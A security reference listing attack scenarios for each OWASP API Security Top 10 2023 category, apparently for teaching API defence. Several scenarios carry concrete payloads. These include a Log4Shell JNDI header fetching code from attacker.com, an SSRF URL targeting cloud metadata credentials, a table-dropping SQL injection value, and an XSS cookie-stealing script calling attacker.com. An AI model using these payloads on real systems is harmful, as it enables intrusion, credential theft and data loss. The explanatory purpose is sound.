# Attack Scenarios — OWASP API Security Top 10 2023

Concrete attack scenarios for each category, drawn from the official OWASP API Security Top 10 2023 documentation.

---

## API1:2023 — Broken Object Level Authorization (BOLA)

### Scenario A — E-Commerce Revenue Scraping
An attacker inspects browser traffic on a hosted e-commerce platform and finds the API endpoint `/shops/{shopName}/revenue_data.json`. Using a separate API endpoint that lists all shop names, the attacker writes a script to replace `{shopName}` across the list. The server performs no ownership check, so the script successfully retrieves sales data for thousands of merchants.

### Scenario B — Remote Vehicle Control
A car manufacturer exposes a mobile API that allows drivers to remotely start/stop the engine. The API accepts a Vehicle Identification Number (VIN) supplied by the client. The API fails to validate that the VIN belongs to the authenticated user. An attacker who obtains another user's VIN can control that vehicle.

### Scenario C — GraphQL Document Deletion
A document storage service uses a GraphQL mutation `deleteReports(reportKeys: ["<DOCUMENT_ID>"])`. The server deletes the document without checking that the calling user owns it. Any authenticated user can delete any document by supplying its ID.

---

## API2:2023 — Broken Authentication

### Scenario A — GraphQL Batch Brute Force
A login endpoint enforces a rate limit of 5 failed attempts per IP. An attacker discovers the API uses GraphQL and constructs a batched request containing 1,000 login mutation attempts in a single HTTP request. The rate limiter counts one request, not 1,000 attempts, so the attacker exhausts the password space undetected.

### Scenario B — Account Takeover via Email Change
An API allows users to change their email address with a single authenticated call, without requiring password confirmation. An attacker steals a short-lived session token (via XSS), changes the account's email to an attacker-controlled address, and then triggers password reset — achieving full account takeover even after the original token expires.

---

## API3:2023 — Broken Object Property Level Authorization

### Scenario A — Internal Field Exposed in Response
A dating app's "report user" GraphQL mutation returns the reported user's `fullName` and `recentLocation` in the API response — fields that should not be visible to the reporting user. Any member can exfiltrate another user's precise location by filing a report.

### Scenario B — Mass Assignment Price Manipulation
A booking platform's host approval endpoint accepts `POST /api/host/approve_booking` with `{ "approved": true }`. A host discovers that appending `"total_stay_price": "$1,000,000"` to the payload modifies the stored price. No validation restricts which properties the host can write, so the guest is overcharged.

### Scenario C — Privilege Escalation via Blocked Flag
A video platform's content filter can block uploaded videos. The update endpoint `PUT /api/video/update_video` accepts arbitrary JSON. An attacker replays the request with `"blocked": false` added, unsetting the moderation flag and making their blocked content visible.

---

## API4:2023 — Unrestricted Resource Consumption

### Scenario A — SMS Cost Amplification
An API exposes `POST /api/send-otp` which triggers an SMS via a paid provider. An attacker scripts 10,000 requests per minute to this endpoint with real phone numbers. At $0.01 per SMS the attack generates $100/minute in charges before detection.

### Scenario B — Memory Exhaustion via Batch Query
A GraphQL API allows batched queries. An attacker constructs a single request with 500 deeply nested queries, each performing a database join. The server allocates memory proportional to the batch size, exhausting the heap and causing an OOM crash.

### Scenario C — Bandwidth Abuse via Uncached Large Files
A file-download API serves large video files. Files over 500 MB bypass the CDN cache. An attacker repeatedly requests the same 2 GB file, generating $0.08/GB egress charges and saturating the origin server's bandwidth.

---

## API5:2023 — Broken Function Level Authorization (BFLA)

### Scenario A — Invite Escalation
During registration, the mobile app calls `GET /api/invites/{invite_guid}` to validate an invite code. An attacker inspects this request and tries `POST /api/invites/new`. The endpoint — intended only for the admin console — lacks authorization checks. The attacker creates an invite with `"role": "admin"` and uses it to register an admin account.

### Scenario B — User Enumeration via Admin Endpoint
An API exposes `GET /api/admin/v1/users/all` which returns all user records. No function-level authorization check exists on this endpoint. An attacker who discovers the URL structure by examining the mobile app's JavaScript bundle can retrieve the full user database without admin credentials.

---

## API6:2023 — Unrestricted Access to Sensitive Business Flows

### Scenario A — Limited-Edition Console Scalping
On the release day for a high-demand gaming console, an attacker runs a purchasing script distributed across multiple IP addresses. The purchase API lacks device fingerprinting or purchase velocity limits. The script completes purchases for the majority of available stock within seconds, which the attacker then resells at a premium.

### Scenario B — Airline Seat Squatting
An airline allows free cancellation. An attacker books 90% of the seats on a desirable flight, waits until close to departure when the airline discounts fares to fill the plane, then cancels all reservations and immediately re-books at the discounted price.

### Scenario C — Referral Credit Farming
A ride-sharing app grants $5 credit for each new user referral. An attacker scripts account creation using temporary email addresses, crediting $5 per account to their primary wallet. The referral endpoint has no velocity check or device uniqueness validation.

---

## API7:2023 — Server-Side Request Forgery (SSRF)

### Scenario A — Cloud Metadata Credential Theft
A social network's profile picture upload feature accepts a URL as input instead of a binary file. An attacker supplies `http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role`. The server fetches the URL and returns the temporary AWS credentials in the response or stores them internally, granting the attacker IAM access.

### Scenario B — Internal Port Scanning via Webhook
A SaaS product allows users to register a webhook URL that receives event notifications. An attacker registers `http://internal-service:6379/` (Redis) and `http://internal-service:5432/` (PostgreSQL) as webhook destinations. The error responses reveal which internal ports are open, mapping the internal network.

---

## API8:2023 — Security Misconfiguration

### Scenario A — Log4Shell via API Version Header
An API back-end logs every request in the format `<method> <api_version>/<path> - <status>` using a logging library with JNDI lookup enabled. An attacker sends:
```
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
```
The logger resolves the JNDI expression, fetches, and executes `Malicious.class` from the attacker's server — achieving Remote Code Execution.

### Scenario B — Private Messages Cached in Browser
A direct-messaging API response for `GET /dm/user_updates.json` lacks `Cache-Control: no-store`. A shared browser (hotel kiosk, library computer) caches the response. A subsequent user on the same machine can retrieve the private conversation from the browser's disk cache.

---

## API9:2023 — Improper Inventory Management

### Scenario A — Shadow Host Bypasses Rate Limiting
A social network implemented rate limiting on `api.socialnetwork.owasp.org` to prevent password-reset token brute forcing. A researcher discovers `beta.api.socialnetwork.owasp.org` running the same codebase but without the rate-limiting middleware. The 6-digit numeric reset token is cracked in under 17 minutes via brute force on the shadow host.

### Scenario B — Third-Party Data Exfiltration
A social network allows third-party apps to integrate using OAuth. The API's data-sharing controls are insufficiently restrictive — third-party apps receive not only the consenting user's data but also their friends' private information. A consulting firm acquires consent from 270,000 users and ultimately accesses the private data of 50,000,000 users.

---

## API10:2023 — Unsafe Consumption of APIs

### Scenario A — SQL Injection via Partner API Response
An application retrieves user records from a partner API and inserts them into a local database for caching:
```python
data = requests.get("https://partner.api/users/123").json()
db.execute(f"INSERT INTO cache VALUES ('{data['email']}')")
```
An attacker compromises the partner API and injects `'; DROP TABLE cache; --` as the email value. The local database executes the injected SQL.

### Scenario B — Open Redirect via Compromised CDN
An application fetches resource URLs from a third-party CDN API and automatically follows redirects (`allow_redirects=True`). An attacker who compromises the CDN API modifies a URL to redirect to `http://attacker.com/steal?token=`. The application follows the redirect and leaks the Bearer token in the `Authorization` header to the attacker's server.

### Scenario C — XSS via Repository Name Injection
An internal developer dashboard fetches repository metadata from the GitHub API and renders repository names directly into HTML without escaping. An attacker creates a repository named `<script>document.location='https://attacker.com/?c='+document.cookie</script>`. When an administrator views the dashboard, the script executes and exfiltrates session cookies.
